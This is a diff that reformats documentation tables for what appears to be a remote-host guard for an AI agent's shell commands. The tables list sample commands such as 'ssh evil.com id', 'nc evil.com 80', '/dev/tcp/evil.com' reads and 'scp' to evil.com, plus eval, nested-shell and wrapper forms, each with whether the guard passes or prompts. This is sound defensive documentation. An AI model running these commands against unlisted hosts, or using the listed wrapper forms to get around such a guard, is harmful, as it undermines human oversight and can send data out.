@@ -43,11 +43,11 @@ $ echo '{"tool_name":"Bash","tool_input":{"command":"ssh evil.com id"}}' | bun n
 
 `remoteHosts` defines three host lists:
 
-| Option | Type | Default | Meaning |
-|---|---|---|---|
-| `trusted` | `string[]` | `[]` | Host names or patterns permitted for any command |
-| `readOnly` | `string[]` | `[]` | Host names or patterns permitted only for strict read-only commands |
-| `localFile` | `string` | `'.agents/hooks/trusted-hosts.local'` | Path to a personal uncommitted list of trusted hosts |
+| Option      | Type       | Default                               | Meaning                                                             |
+| ----------- | ---------- | ------------------------------------- | ------------------------------------------------------------------- |
+| `trusted`   | `string[]` | `[]`                                  | Host names or patterns permitted for any command                    |
+| `readOnly`  | `string[]` | `[]`                                  | Host names or patterns permitted only for strict read-only commands |
+| `localFile` | `string`   | `'.agents/hooks/trusted-hosts.local'` | Path to a personal uncommitted list of trusted hosts                |
 
 `localFile` stores personal trusted hosts outside repository version control.
 Add the file path to `.gitignore`.
@@ -82,12 +82,12 @@ An entry containing an environment variable like `$VAR` or `${VAR}` matches the 
 
 Configuration rejects entries containing usernames, paths, or port numbers.
 
-| Entry | Matches | Does not match |
-|---|---|---|
-| `lab1` | `lab1`, `LAB1` | `lab1.evil.com`, `evil-lab1`, `lab1@evil.com`, `lab10` |
-| `*.lab.example.com` | `a.lab.example.com`, `a.b.lab.example.com` | `lab.example.com`, `a.lab.example.com.evil.com` |
-| `prod1` | `prod1` | `prod1.corp.example` (use `prod1.*`) |
-| `$LAB_HOST` | `$LAB_HOST`, `${LAB_HOST}` | `$other` |
+| Entry               | Matches                                    | Does not match                                         |
+| ------------------- | ------------------------------------------ | ------------------------------------------------------ |
+| `lab1`              | `lab1`, `LAB1`                             | `lab1.evil.com`, `evil-lab1`, `lab1@evil.com`, `lab10` |
+| `*.lab.example.com` | `a.lab.example.com`, `a.b.lab.example.com` | `lab.example.com`, `a.lab.example.com.evil.com`        |
+| `prod1`             | `prod1`                                    | `prod1.corp.example` (use `prod1.*`)                   |
+| `$LAB_HOST`         | `$LAB_HOST`, `${LAB_HOST}`                 | `$other`                                               |
 
 ## Which commands are read
 
@@ -98,46 +98,46 @@ Flags `-o ProxyJump` and `-J` are parsed as hosts and checked against the lists.
 
 The following table demonstrates how the guard handles each door when tested against `lab1` (trusted), `evil.com` (unlisted), and `prod1` (readOnly):
 
-| Door | Example | Result |
-|---|---|---|
-| SSH client | `ssh lab1 uptime` | Passes |
-| SSH client | `ssh evil.com id` | Prompts |
-| SFTP client | `sftp lab1` | Passes |
-| SFTP client | `sftp evil.com` | Prompts |
-| Mosh client | `mosh evil.com` | Prompts |
-| File copy | `scp ./build.tgz lab1:/srv/` | Passes |
-| File copy | `scp f evil.com:/tmp/lab1` | Prompts |
-| Rsync transfer | `rsync -avz ./dist/ lab1:/srv/app/` | Passes |
-| Rsync transfer | `rsync -a ./x evil.com:/srv/lab1/` | Prompts |
-| Kubernetes | `kubectl --context lab1 get pods` | Passes |
-| Kubernetes | `kubectl --context evil get pods` | Prompts |
-| Kubernetes | `kubectl get pods` | Prompts |
-| Kubernetes tools | `helm --kube-context evil list` | Prompts |
-| Kubernetes tools | `k9s --context evil` | Prompts |
-| Docker daemon | `docker -H ssh://lab1 ps` | Passes |
-| Docker daemon | `docker -H ssh://evil.com ps` | Prompts |
-| Docker context | `docker --context prod ps` | Prompts |
-| Network client | `nc lab1 22` | Passes |
-| Network client | `nc evil.com 80` | Prompts |
-| Telnet client | `telnet evil.com 25` | Prompts |
-| HTTP client | `curl https://example.com/data.json` | Passes |
-| Network device path | `cat < /dev/tcp/lab1/80` | Passes |
-| Network device path | `cat < /dev/tcp/evil.com/80` | Prompts |
-| Repository clone URL | `git clone ssh://git@evil.com/x.git` | Prompts |
-| Command wrapper | `sudo ssh lab1 uptime` | Passes |
-| Command wrapper | `sudo ssh evil.com` | Prompts |
-| Environment wrapper | `env FOO=1 ssh evil.com` | Prompts |
-| Execution wrapper | `xargs -n1 ssh < hosts.txt` | Prompts |
-| Nested shell | `bash -c "ssh lab1 uptime"` | Passes |
-| Nested shell | `bash -c "ssh evil.com"` | Prompts |
-| Shell eval | `eval "ssh evil.com"` | Prompts |
-| Find execution | `find . -exec ssh evil.com {} \;` | Prompts |
-| Shell loop | `for h in lab1 prod1; do ssh $h id; done` | Prompts |
-| Shell conditional | `if ssh lab1 id; then echo ok; fi` | Passes |
-| Shell conditional | `if ssh evil.com id; then echo ok; fi` | Prompts |
-| Nested remote command | `ssh lab1 "ssh prod1 uptime"` | Passes |
-| Nested remote command | `ssh lab1 "ssh evil.com id"` | Prompts |
-| Piped shell | `bash <<< "ssh evil.com"` | Prompts |
+| Door                   | Example                                                                                                     | Result  |
+| ---------------------- | ----------------------------------------------------------------------------------------------------------- | ------- |
+| SSH client             | `ssh lab1 uptime`                                                                                           | Passes  |
+| SSH client             | `ssh evil.com id`                                                                                           | Prompts |
+| SFTP client            | `sftp lab1`                                                                                                 | Passes  |
+| SFTP client            | `sftp evil.com`                                                                                             | Prompts |
+| Mosh client            | `mosh evil.com`                                                                                             | Prompts |
+| File copy              | `scp ./build.tgz lab1:/srv/`                                                                                | Passes  |
+| File copy              | `scp f evil.com:/tmp/lab1`                                                                                  | Prompts |
+| Rsync transfer         | `rsync -avz ./dist/ lab1:/srv/app/`                                                                         | Passes  |
+| Rsync transfer         | `rsync -a ./x evil.com:/srv/lab1/`                                                                          | Prompts |
+| Kubernetes             | `kubectl --context lab1 get pods`                                                                           | Passes  |
+| Kubernetes             | `kubectl --context evil get pods`                                                                           | Prompts |
+| Kubernetes             | `kubectl get pods`                                                                                          | Prompts |
+| Kubernetes tools       | `helm --kube-context evil list`                                                                             | Prompts |
+| Kubernetes tools       | `k9s --context evil`                                                                                        | Prompts |
+| Docker daemon          | `docker -H ssh://lab1 ps`                                                                                   | Passes  |
+| Docker daemon          | `docker -H ssh://evil.com ps`                                                                               | Prompts |
+| Docker context         | `docker --context prod ps`                                                                                  | Prompts |
+| Network client         | `nc lab1 22`                                                                                                | Passes  |
+| Network client         | `nc evil.com 80`                                                                                            | Prompts |
+| Telnet client          | `telnet evil.com 25`                                                                                        | Prompts |
+| HTTP client            | `curl https://example.com/data.json`                                                                        | Passes  |
+| Network device path    | `cat < /dev/tcp/lab1/80`                                                                                    | Passes  |
+| Network device path    | `cat < /dev/tcp/evil.com/80`                                                                                | Prompts |
+| Repository clone URL   | `git clone ssh://git@evil.com/x.git`                                                                        | Prompts |
+| Command wrapper        | `sudo ssh lab1 uptime`                                                                                      | Passes  |
+| Command wrapper        | `sudo ssh evil.com`                                                                                         | Prompts |
+| Environment wrapper    | `env FOO=1 ssh evil.com`                                                                                    | Prompts |
+| Execution wrapper      | `xargs -n1 ssh < hosts.txt`                                                                                 | Prompts |
+| Nested shell           | `bash -c "ssh lab1 uptime"`                                                                                 | Passes  |
+| Nested shell           | `bash -c "ssh evil.com"`                                                                                    | Prompts |
+| Shell eval             | `eval "ssh evil.com"`                                                                                       | Prompts |
+| Find execution         | `find . -exec ssh evil.com {} \;`                                                                           | Prompts |
+| Shell loop             | `for h in lab1 prod1; do ssh $h id; done`                                                                   | Prompts |
+| Shell conditional      | `if ssh lab1 id; then echo ok; fi`                                                                          | Passes  |
+| Shell conditional      | `if ssh evil.com id; then echo ok; fi`                                                                      | Prompts |
+| Nested remote command  | `ssh lab1 "ssh prod1 uptime"`                                                                               | Passes  |
+| Nested remote command  | `ssh lab1 "ssh evil.com id"`                                                                                | Prompts |
+| Piped shell            | `bash <<< "ssh evil.com"`                                                                                   | Prompts |
 | Connection redirection | `GIT_SSH_COMMAND`, `GIT_SSH`, `RSYNC_RSH`, `DOCKER_HOST`, `DOCKER_CONTEXT`, `KUBECONFIG`, `core.sshCommand` | Prompts |
 
 ## What cannot be read asks
@@ -178,12 +178,12 @@ A local command does not ask (`ssh prod1 uptime; rm -rf /tmp/x` passes).
 A pipe into a local command passes (`ssh prod1 uptime | grep load`).
 HTTP clients stay silent for hosts in neither list and ask for a readOnly host.
 
-| Form | Passes |
-|---|---|
-| `ssh <host> <command>` | No ssh options; one of these remote commands: `uptime`, `hostname`, `df -h`, `free -m`, `docker ps` (optional `-a`), `docker compose ps`, `ls [flags] <path>` (optional single flag group), `cat <path>`, `tail -n <N> <path>`, `systemctl status <unit>` (optional `--no-pager`), `journalctl -u <unit> -n <N> --no-pager`, `docker logs --tail <N> <unit>`. Every `<path>` must be absolute. |
-| `scp [flags] <host>:<source> <target>` | Flags restricted to `-[rpqC]+`; source must be an absolute remote path, target must be a relative local path |
-| `rsync [flags] <host>:<source> <target>` | Flags restricted to `-[avzrhPt]+`; source must be an absolute remote path, target must be a relative local path |
-| `kubectl --context <host> <verb>` | Read verbs: `get`, `describe`, `logs`, `top` |
+| Form                                     | Passes                                                                                                                                                                                                                                                                                                                                                                                         |
+| ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `ssh <host> <command>`                   | No ssh options; one of these remote commands: `uptime`, `hostname`, `df -h`, `free -m`, `docker ps` (optional `-a`), `docker compose ps`, `ls [flags] <path>` (optional single flag group), `cat <path>`, `tail -n <N> <path>`, `systemctl status <unit>` (optional `--no-pager`), `journalctl -u <unit> -n <N> --no-pager`, `docker logs --tail <N> <unit>`. Every `<path>` must be absolute. |
+| `scp [flags] <host>:<source> <target>`   | Flags restricted to `-[rpqC]+`; source must be an absolute remote path, target must be a relative local path                                                                                                                                                                                                                                                                                   |
+| `rsync [flags] <host>:<source> <target>` | Flags restricted to `-[avzrhPt]+`; source must be an absolute remote path, target must be a relative local path                                                                                                                                                                                                                                                                                |
+| `kubectl --context <host> <verb>`        | Read verbs: `get`, `describe`, `logs`, `top`                                                                                                                                                                                                                                                                                                                                                   |
 
 When a command attempts to modify a `readOnly` host, the guard prompts:
 
